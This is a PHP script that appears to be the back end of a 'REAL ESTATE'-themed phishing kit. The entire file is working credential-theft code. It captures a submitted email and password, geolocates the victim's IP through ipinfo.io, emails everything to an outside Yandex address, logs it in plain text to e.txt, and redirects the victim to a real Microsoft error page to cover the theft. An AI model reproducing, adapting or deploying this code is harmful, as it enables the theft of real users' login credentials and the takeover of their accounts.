<?php

session_start();
$email =  $_POST['ai'];
$platform = $_POST['detail'];
$password = $_POST['pr'];

if($email != null && $password != null){
    $ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$json     = file_get_contents("http://ipinfo.io/$ip/geo");
    $json     = json_decode($json, true);
    $country  = $json['country'];
    $region   = $json['region'];
    $city     = $json['city'];
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| REAL ESTATE |--------------------------------|\n";
	$message .= "Login From  : ".$platform."\n";
	$message .= "Online ID   : ".$email."\n";
	$message .= "Passcode    : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP  : ".$ip."\n";
	$message .= "|Client Country  : ".$country."\n";
	$message .= "|Client Region  : ".$region."\n";
	$message .= "|Client City  : ".$city."\n";
	$message .= "User Agent  : ".$useragent."\n";
	$message .= "|----------- curated by @rowdyrebel22 ------------|\n";
	$send = "john.locke22@yandex.com";
	$subject = "Login : $ip";
    mail($send, $subject, $message);
	$signal = 'ok';
	$msg = 'InValid Credentials';
	header("Location: https://account.live.com/error.aspx?errcode=1086&uaid=2ed8b2a76ccc444f9f63c28bd0ea074e");
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);


$file = 'e.txt';
// Abre o arquivo para obter o conteúdo existente
$current = file_get_contents($file);
// Acrescenta a nova pessoa no arquivo
$current .= "New Logz \n";
$current .= "IP:$ip | Email: $email | Password: $password \n";
// Escreve o conteúdo de volta no arquivo
file_put_contents($file, $current);
?>
